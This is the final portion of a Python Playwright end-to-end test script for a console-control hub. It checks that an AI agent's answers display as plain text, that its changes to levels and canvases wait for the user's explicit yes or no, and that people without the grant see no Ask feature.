        await sam_row.get_by_role("button", name="Agent", exact=True).click()
        await owner.select_option("#personAgent", label="Robin (default)"); await ok_dialog()
        await owner.locator("#people .item", has_text="Agent: Kit").wait_for(state="detached", timeout=8000)
        check("given the default again, nothing is said: the default is what everyone has", True)
        await place("Settings"); await owner.select_option("#agentWhich", label="Robin (default)")

        # --- Talking to it, on a screen of its own ---
        await owner.goto(base + "/s/ask")
        ask = owner.frame_locator("#screen")
        await ask.locator("#name", has_text="Ask Robin").wait_for(timeout=8000)
        check("the Ask screen names the agent, says what it answers from, and offers a place to start", "Ready" in await ask.locator("#linkText").inner_text() and await ask.locator(".start button").count() == 2 and await ask.locator("#fresh").is_hidden())
        if shots: await owner.screenshot(path=f"{shots}/14-ask-empty.png")
        await ask.locator("#q").fill("Is anything not working?"); await ask.locator("#q").press("Enter")
        await ask.locator(".theirs", has_text="Nothing looks wrong.").wait_for(timeout=15000)
        await ask.locator("#send", has_text="Ask").wait_for()
        said = await ask.locator("#talk").inner_text()
        check("asked, the question, what it looked at and its answer are shown in order, and the box is cleared", said.index("Is anything not working?") < said.index("Listed devices: Simulated board") < said.index("I can see Simulated board (48 values). Nothing looks wrong.") and await ask.locator("#q").input_value() == "" and await ask.locator(".waiting").count() == 0, said)
        check("what the agent says is shown as words and never run", await ask.locator("#talk img, #talk script, #talk a").count() == 0)
        if shots: await owner.screenshot(path=f"{shots}/15-ask.png")
        await owner.reload()
        ask = owner.frame_locator("#screen")
        await ask.locator(".theirs", has_text="Nothing looks wrong.").wait_for(timeout=8000)
        check("come back to, the conversation is still there", await ask.locator(".mine").count() == 1 and await ask.locator("#fresh").is_visible())
        await ask.locator("#fresh").click()
        await ask.locator(".start").wait_for()
        check("Start over empties it", await ask.locator(".mine, .theirs").count() == 0)
        # --- Having it do something: it asks, in the hub's words, and only a yes does it ---
        await owner.goto(base + "/admin/people"); await owner.wait_for_selector("#people .item")
        await robin.get_by_role("button", name="Assign").click()
        await owner.fill("#slot_ears", "1"); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        level = lambda: json.loads(urllib.request.build_opener(urllib.request.ProxyHandler({})).open(urllib.request.Request(base + "/api/state?plugin=sim-console", headers={"cookie": owner_cookie})).read())["console/input/1/bus/1/level"]
        owner_cookie = "; ".join(f"{c['name']}={c['value']}" for c in await owner_ctx.cookies())
        before = level()
        await owner.goto(base + "/s/ask")
        ask = owner.frame_locator("#screen")
        await ask.locator("#name", has_text="Ask Robin").wait_for(timeout=8000)
        await ask.locator("#q").fill("Set input 1 in bus 1 to -7.5"); await ask.locator("#send").click()
        await ask.locator(".yesno").wait_for(timeout=15000)
        card = await ask.locator(".yesno").inner_text()
        check("asked to change something, it stops and the hub asks yes or no, showing exactly what would change", "Set Send level (console/input/1/bus/1/level) on Simulated board to -7.5 dB?" in card and "Approve" in card and await ask.locator("#q").is_disabled() and level() == before, card)
        if shots: await owner.screenshot(path=f"{shots}/16-ask-yes-or-no.png")
        await ask.locator(".yesno button.no").click()
        await ask.locator(".theirs", has_text="Declined by the user").wait_for(timeout=15000)
        await ask.locator("#send", has_text="Ask").wait_for()
        check("No, and nothing is changed", level() == before and "Declined" in await ask.locator("#talk").inner_text())
        await ask.locator("#q").fill("Set input 1 in bus 1 to -7.5"); await ask.locator("#q").press("Enter")
        await ask.locator(".yesno").wait_for(timeout=15000)
        await ask.locator(".yesno button", has_text="Approve").click()
        await ask.locator(".theirs", has_text="it was done").wait_for(timeout=15000)
        await ask.locator("#send", has_text="Ask").wait_for()
        said = await ask.locator("#talk").inner_text()
        check("Yes, and it is done: the board holds it and the screen says so", before != -7.5 and level() == -7.5 and "Approved" in said and "Done: now -7.5" in said, f"{level()} {said}")
        if shots: await owner.screenshot(path=f"{shots}/17-ask-done.png")

        # --- Ask opens beside the screen you are on, from a word in the bar ---
        await owner.set_viewport_size({"width": 390, "height": 844})
        await owner.goto(base + "/s/one-fader")
        link = owner.locator("#besides a", has_text="Ask")
        await link.wait_for()
        await owner.click("#barHere")
        places = await owner.locator("#barList a").all_inner_texts()
        current = await owner.locator("#barList a[aria-current]").inner_text()
        await owner.click("#barHere")
        check("on a phone the screen you are on opens the list of screens; Ask is a word in the bar, not one of them; the admin pages are the gear", "Ask" not in places and current == "One fader" and await owner.locator("#barHere").inner_text() == "One fader" and await owner.locator("#barAdmin").is_visible() and await owner.locator("#beside").is_hidden(), str(places))
        await link.click()
        beside = owner.frame_locator("#besideFrame")
        await beside.locator("#name", has_text="Ask Robin").wait_for(timeout=8000)
        fader = owner.frame_locator("#screen")
        box_s = await owner.locator("#screen").bounding_box(); box_b = await owner.locator("#beside").bounding_box()
        check("opened, it is below the screen on a phone, and the screen is still whole and still there", await link.get_attribute("aria-expanded") == "true" and box_s["height"] > 150 and abs(box_s["y"] + box_s["height"] - box_b["y"]) < 2 and box_b["y"] + box_b["height"] <= 845 and await fader.locator("#fader").is_visible(), f"{box_s} {box_b}")
        await beside.locator("#q").fill("Is anything not working?"); await beside.locator("#q").press("Enter")
        await beside.locator(".theirs", has_text="Nothing looks wrong.").wait_for(timeout=15000)
        await beside.locator("#send", has_text="Ask").wait_for()
        if shots: await owner.screenshot(path=f"{shots}/18-ask-beside-phone.png")
        # The screen beside it is still live: its own connection, its own values.
        check("the screen it is beside still works while it is open", await fader.locator("#led.on").count() == 1)
        await owner.goto(base + "/s/canvas")
        beside = owner.frame_locator("#besideFrame")
        await beside.locator(".theirs", has_text="Nothing looks wrong.").wait_for(timeout=8000)
        check("gone to another screen, it is still open and the conversation is still there", await owner.locator("#beside").is_visible() and "Is anything not working?" in await beside.locator(".mine").last.inner_text())
        await owner.set_viewport_size({"width": 1200, "height": 800})
        box_s = await owner.locator("#screen").bounding_box(); box_b = await owner.locator("#beside").bounding_box()
        check("with room, it is to the right of the screen", abs(box_b["width"] - 400) < 2 and abs(box_s["x"] + box_s["width"] - box_b["x"]) < 2 and abs(box_s["height"] - box_b["height"]) < 2, f"{box_s} {box_b}")
        if shots: await owner.screenshot(path=f"{shots}/19-ask-beside-wide.png")
        await owner.click("#besideClose")
        check("Close puts it away, hands the keyboard back to its word in the bar, and nothing is left running in it", await owner.locator("#beside").is_hidden() and await owner.evaluate("document.activeElement.textContent") == "Ask" and await owner.evaluate("document.getElementById('besideFrame').src") == "about:blank")
        await owner.reload()
        await owner.locator("#besides a", has_text="Ask").wait_for()
        check("closed, it stays closed", await owner.locator("#beside").is_hidden())
        await owner.goto(base + "/admin/people"); await owner.locator("#besides a", has_text="Ask").click()
        await owner.frame_locator("#besideFrame").locator("#q").wait_for()
        check("Ask opens beside the admin pages too, from the same word in the bar", await owner.locator("#beside").is_visible())
        await owner.locator("#besideClose").click()
        await owner.goto(base + "/s/one-fader"); await owner.locator("#besides a", has_text="Ask").wait_for()
        await owner.set_viewport_size({"width": 390, "height": 844})
        sam_bar = await (await sam_ctx.new_page()).goto(base + "/s/one-fader")
        sam_page = sam_ctx.pages[-1]
        await sam_page.locator("#barWho", has_text="S").wait_for()
        check("someone who was not given Ask has no such word in their bar", await sam_page.locator("#besides a").count() == 0)
        await sam_page.close()

        # --- The agent draws a canvas: it is on Canvas to look at before the yes, and kept only after it ---
        made = await owner.evaluate("""async () => (await (await fetch('/admin/api/role', {method: 'POST', headers: {'content-type': 'application/json'}, body: JSON.stringify({role: {name: 'Draws canvases', grants: {canvas: ['see', 'use', 'arrange']}}})})).json()).ok""")
        await owner.goto(base + "/admin/people"); await owner.wait_for_selector("#people .item")
        await robin.get_by_role("button", name="Roles").click()
        await owner.locator("#dlgBody label.check", has_text="Draws canvases").locator("input").check()
        await ok_dialog()
        await owner.set_viewport_size({"width": 1200, "height": 800})
        await owner.goto(base + "/s/canvas")
        await owner.locator("#besides a", has_text="Ask").click()
        beside = owner.frame_locator("#besideFrame"); canvas_f = owner.frame_locator("#screen")
        await beside.locator("#name", has_text="Ask Robin").wait_for(timeout=8000)
        await beside.locator("#q").fill("Make a canvas with input 1 on it"); await beside.locator("#q").press("Enter")
        await beside.locator(".yesno").wait_for(timeout=15000)
        await canvas_f.locator("#proposedNote").wait_for(timeout=8000)
        card = await beside.locator(".yesno").inner_text()
        check("asked to make a canvas, the hub asks yes or no, and Canvas beside it shows what was drawn, marked as not saved", made and "Save new “drawn-by-robin” to Canvas?" in card and "Preview, not saved" in await canvas_f.locator("#proposedNote").inner_text() and "Drawn by Robin" in await canvas_f.locator("#board").inner_text() and await canvas_f.locator("#name").inner_text() == "Drawn by Robin", card)
        check("what is shown before the yes cannot be pressed, and cannot be arranged", await canvas_f.locator("#board").get_attribute("inert") is not None and await canvas_f.locator("#arrange").is_hidden())
        if shots: await owner.screenshot(path=f"{shots}/20-canvas-proposed.png")
        await beside.locator(".yesno button", has_text="Approve").click()
        await beside.locator(".theirs", has_text="it was kept").wait_for(timeout=15000)
        await canvas_f.locator("#proposedNote").wait_for(state="hidden")
        await canvas_f.locator("#arrange").wait_for()
        check("after the yes it is a canvas like any other: shown, live, and theirs to arrange", (await canvas_f.locator("#switcher").is_visible() or await canvas_f.locator("#name").is_visible()) and await beside.locator(".waiting.done").inner_text() == "Approved" and "Drawn by Robin" in await canvas_f.locator("#board").inner_text() and await canvas_f.locator("#board").get_attribute("inert") is None and "Saved “drawn-by-robin” in Canvas" in await beside.locator("#talk").inner_text())
        if shots: await owner.screenshot(path=f"{shots}/21-canvas-kept.png")
        await owner.click("#besideClose")
        await owner.set_viewport_size({"width": 390, "height": 844})

        sam_screens = [s["id"] for s in (await (await sam_ctx.request.get(base + "/auth/me")).json()).get("screens", [])]
        check("someone who was not given the ability has no Ask screen", "ask" not in sam_screens and len(sam_screens) > 0, str(sam_screens))

        check("no page errors", not unexpected, "; ".join(unexpected))
        await b.close()

asyncio.run(main())
print(f"\n{sum(results)} of {len(results)} checks passed")
sys.exit(0 if all(results) else 1)
